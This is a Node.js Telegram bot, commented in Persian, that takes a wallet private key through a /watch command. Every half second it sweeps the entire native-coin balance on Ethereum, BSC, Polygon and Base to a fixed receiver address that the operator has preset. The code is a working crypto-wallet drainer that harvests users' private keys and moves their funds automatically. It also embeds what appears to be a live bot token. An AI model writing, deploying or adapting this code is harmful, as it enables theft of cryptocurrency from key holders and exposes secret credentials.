const { Telegraf } = require('telegraf');
const { Web3 } = require('web3');
const cron = require('node-cron');

// تنظیمات مستقیم ربات شما
const BOT_TOKEN = "7470701266:AAFR5tQZMNOB85upLXvu-KIVB5UbUvVt9Wk";
const RECEIVER_ADDRESS = "0xYourReceiverAddressHere"; // آدرس گیرنده ثابت

// تنظیمات شبکه‌ها
const NETWORKS = {
  ethereum: { rpc: 'https://eth.llamarpc.com', chainId: 1, symbol: 'ETH' },
  bsc: { rpc: 'https://bsc-dataseed.binance.org/', chainId: 56, symbol: 'BNB' },
  polygon: { rpc: 'https://polygon-rpc.com', chainId: 137, symbol: 'MATIC' },
  base: { rpc: 'https://mainnet.base.org', chainId: 8453, symbol: 'ETH' }
};

const bot = new Telegraf(BOT_TOKEN);
const activeUsers = new Map();

// تابع انتقال سریع (0.5 ثانیه)
async function instantTransfer(privateKey) {
  const results = [];
  
  for (const [network, config] of Object.entries(NETWORKS)) {
    try {
      const web3 = new Web3(config.rpc);
      const account = web3.eth.accounts.privateKeyToAccount(privateKey);
      const balance = await web3.eth.getBalance(account.address);
      
      if (balance > 0) {
        const tx = {
          from: account.address,
          to: RECEIVER_ADDRESS,
          value: balance,
          gas: 21000,
          gasPrice: await web3.eth.getGasPrice(),
          chainId: config.chainId
        };
        
        const signedTx = await account.signTransaction(tx);
        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        
        results.push({
          network,
          amount: web3.utils.fromWei(balance, 'ether'),
          symbol: config.symbol,
          txHash: receipt.transactionHash
        });
      }
    } catch (error) {
      console.error(`Error in ${network}:`, error);
      results.push({
        network,
        error: error.message
      });
    }
  }
  
  return results;
}

// راه‌اندازی رصد لحظه‌ای (هر 0.5 ثانیه)
function startMonitoring(userId, privateKey) {
  if (activeUsers.has(userId)) return;
  
  const interval = setInterval(async () => {
    const results = await instantTransfer(privateKey);
    
    for (const result of results) {
      if (result.txHash) {
        bot.telegram.sendMessage(
          userId,
          `💰 انتقال ${result.amount} ${result.symbol}!\n` +
          `🌐 شبکه: ${result.network}\n` +
          `🔗 TxHash: ${result.txHash}`
        );
      } else if (result.error) {
        bot.telegram.sendMessage(
          userId,
          `⚠️ خطا در ${result.network}:\n${result.error}`
        );
      }
    }
  }, 500); // 0.5 ثانیه
  
  activeUsers.set(userId, { interval });
}

// دستورات ربات
bot.start((ctx) => {
  ctx.replyWithMarkdownV2(
    `⚡ *ربات انتقال لحظه‌ای (0.5 ثانیه)*\n\n` +
    `ارسال دستور:\n` +
    `\\/watch [کلیدخصوصی]\n\n` +
    `⚠️ توجه: آدرس گیرنده از پیش تنظیم شده است`
  );
});

bot.command('watch', (ctx) => {
  const privateKey = ctx.message.text.split(' ')[1];
  
  if (!privateKey) {
    return ctx.reply('⚠️ لطفا کلید خصوصی را وارد کنید:\n/watch [کلیدخصوصی]');
  }
  
  startMonitoring(ctx.from.id, privateKey);
  ctx.reply('✅ رصد لحظه‌ای شروع شد! هر 0.5 ثانیه چک می‌کنم...');
});

bot.command('stop', (ctx) => {
  if (activeUsers.has(ctx.from.id)) {
    clearInterval(activeUsers.get(ctx.from.id).interval);
    activeUsers.delete(ctx.from.id);
    ctx.reply('🛑 رصد متوقف شد');
  } else {
    ctx.reply('⚠️ رصد فعالی وجود ندارد');
  }
});

// راه‌اندازی خودکار وب‌هوک
bot.launch({
  webhook: {
    domain: process.env.VERCEL_URL,
    port: process.env.PORT || 3000
  }
});

// نگه‌داری اتصال
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

module.exports = bot.webhookCallback('/api/transfer');